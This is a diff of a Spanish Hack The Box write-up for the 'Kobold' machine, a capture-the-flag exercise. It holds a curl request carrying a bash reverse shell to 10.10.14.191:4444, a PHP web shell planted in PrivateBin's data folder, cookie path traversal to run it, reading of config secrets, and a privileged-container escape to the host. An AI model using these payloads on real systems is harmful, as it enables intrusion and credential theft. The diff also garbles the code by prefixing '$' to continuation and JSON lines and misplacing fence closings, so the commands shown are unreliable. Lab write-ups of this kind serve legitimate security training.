@@ -33,15 +33,13 @@ Como en cualquier ejercicio de pentest o HTB, el objetivo inicial no es "tirar e
 Este primer escaneo con `nmap` sirve para detectar puertos abiertos rápidamente y reducir la superficie a analizar.
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -Pn 10.129.31.14
+$ nmap -p- --open -sS --min-rate 5000 -Pn 10.129.31.14
 ```
-
 Una vez identificados los puertos expuestos, este segundo escaneo profundiza en versiones, banners, títulos HTTP y fingerprints de servicio.
 
 ```bash
-nmap -p22,80,443,3552 -sCV 10.129.31.14
+$ nmap -p22,80,443,3552 -sCV 10.129.31.14
 ```
-
 Los indicadores más útiles de esta fase fueron:
 
 - `80/tcp` y `443/tcp` redirigen a `kobold.htb`, lo que obliga a trabajar con nombre virtual y no solo con IP.
@@ -51,11 +49,10 @@ Los indicadores más útiles de esta fase fueron:
 Con ese contexto, el siguiente paso lógico es fuzzear virtual hosts. `wfuzz` se usa aquí no como fuerza bruta ciega, sino como técnica de expansión de superficie aprovechando el wildcard del certificado.
 
 ```bash
-wfuzz -H "Host: FUZZ.kobold.htb" --hc 404,403 --hh=154 \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  https://kobold.htb
+$ wfuzz -H "Host: FUZZ.kobold.htb" --hc 404,403 --hh=154 \
+  $ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  $ https://kobold.htb
 ```
-
 Subdominios relevantes:
 
 - `mcp.kobold.htb` -> MCP Jam
@@ -92,38 +89,35 @@ Lo que vuelve especialmente sospechoso a `/api/mcp/connect` es que el payload ac
 Antes de probar una posible ejecución remota, se prepara un listener con `nc` para recibir una reverse shell y evitar perder tiempo una vez confirmada la explotación.
 
 ```bash
-nc -nlvp 4444
+$ nc -nlvp 4444
 ```
-
 Una vez identificado el endpoint sospechoso, `curl` permite reproducir la petición manualmente y comprobar si el servidor ejecuta el comando especificado en el JSON. Se utiliza `curl` porque elimina cualquier dependencia del cliente web y deja claro que la lógica vulnerable está en el backend.
 
 ```bash
-curl -k https://mcp.kobold.htb/api/mcp/connect \
-  -H "Content-Type: application/json" \
-  -d '{
-    "serverConfig": {
-      "command": "bash",
-      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1"],
-      "env": {}
-    },
-    "serverId": "mytest"
-  }'
+$ curl -k https://mcp.kobold.htb/api/mcp/connect \
+  $ -H "Content-Type: application/json" \
+  $ -d '{
+    $ "serverConfig": {
+      $ "command": "bash",
+      $ "args": ["-c", "bash -i >& /dev/tcp/10.10.14.191/4444 0>&1"],
+      $ "env": {}
+    $ },
+    $ "serverId": "mytest"
+  $ }'
 ```
-
 La ejecución de esta petición devuelve una shell como `ben`, lo que valida la hipótesis de RCE sin necesidad de apoyarse en un exploit público ni en una CVE confirmada.
 
 Este comando contextualiza la shell obtenida y revela un dato clave para la siguiente fase: `ben` pertenece al grupo `operator`.
 
 ```bash
-id
+$ id
 ```
-
 Salida relevante:
 
 ```text
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
-```
 
+```
 La flag de usuario existe en `/home/ben/user.txt`, pero su valor se omite deliberadamente.
 
 ## Enumeración local
@@ -131,23 +125,20 @@ La flag de usuario existe en `/home/ben/user.txt`, pero su valor se omite delibe
 Este comando lista usuarios interactivos y ayuda a identificar otras cuentas potencialmente reutilizadas en servicios internos.
 
 ```bash
-cat /etc/passwd | grep bash
+$ cat /etc/passwd | grep bash
 ```
-
 Este comando enumera puertos en escucha para localizar servicios internos o paneles de administración no evidentes desde fuera.
 
 ```bash
-ss -tulnp
+$ ss -tulnp
 ```
-
 Este hallazgo muestra que el puerto `3552` sigue siendo importante y que existen servicios locales relacionados con la aplicación.
 
 Este comando busca archivos y directorios accesibles por el grupo `operator`, que es justo el grupo del usuario comprometido.
 
 ```bash
-find / -group operator 2>/dev/null
+$ find / -group operator 2>/dev/null
 ```
-
 El resultado interesante es `/privatebin-data`, incluyendo el directorio `data/`, donde se pueden crear ficheros consumidos por PrivateBin.
 
 ## Abuso de PrivateBin
@@ -155,40 +146,37 @@ El resultado interesante es `/privatebin-data`, incluyendo el directorio `data/`
 Este bloque crea un archivo PHP simple dentro del almacenamiento de PrivateBin para comprobar si luego puede ser interpretado desde la aplicación web.
 
 ```bash
-cat > /privatebin-data/data/pwn.php << 'EOF'
-<?php system($_GET['cmd']); ?>
-EOF
+$ cat > /privatebin-data/data/pwn.php << 'EOF'
+$ <?php system($_GET['cmd']); ?>
+$ EOF
 ```
-
 Este `curl` abusa de la cookie `template` para forzar a PrivateBin a cargar el archivo anterior y ejecutar un comando de prueba.
 
 ```bash
-curl -k https://bin.kobold.htb/ \
-  -b "template=../data/pwn" \
-  -G --data-urlencode "cmd=id"
+$ curl -k https://bin.kobold.htb/ \
+  $ -b "template=../data/pwn" \
+  $ -G --data-urlencode "cmd=id"
 ```
-
 Salida relevante:
 
 ```text
 uid=65534(nobody) gid=82(www-data) groups=82(www-data)
-```
 
+```
 Con la ejecución confirmada, este comando intenta leer el fichier de configuración para extraer secretos operativos de la aplicación.
 
 ```bash
-curl -k https://bin.kobold.htb/ \
-  -b "template=../data/pwn" \
-  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
+$ curl -k https://bin.kobold.htb/ \
+  $ -b "template=../data/pwn" \
+  $ -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
 ```
-
 En la respuesta aparece configuración sensible. Los valores se muestran redactados:
 
 ```ini
 usr = "[REDACTED]"
 pwd = "[REDACTED]"
-```
 
+```
 Lo importante no es el secreto en sí, sino el impacto: la misma clave estaba reutilizada para el acceso al panel Arcane con una cuenta administrativa interna.
 
 ## Acceso a Arcane y escape al host
@@ -222,10 +210,9 @@ Una vez lançado el contenedor, Arcane ofrece una shell interactiva dentro de é
 Ya dentro del contenedor, estos comandos validan que se corre como `root` y permiten leer la flag del host a través del montaje `/hostfs`.
 
 ```bash
-whoami
-cat /hostfs/root/root.txt
+$ whoami
+$ cat /hostfs/root/root.txt
 ```
-
 El valor de la flag de `root` se omite deliberadamente.
 
 ## Cadena de explotación
@@ -240,8 +227,8 @@ MCP Jam /api/mcp/connect sin auth
 -> reutilización de credenciales en Arcane
 -> creación de contenedor privilegiado con / montado
 -> acceso a /hostfs/root/root.txt
-```
 
+```
 ## Flags
 
 | Flag | Valor |
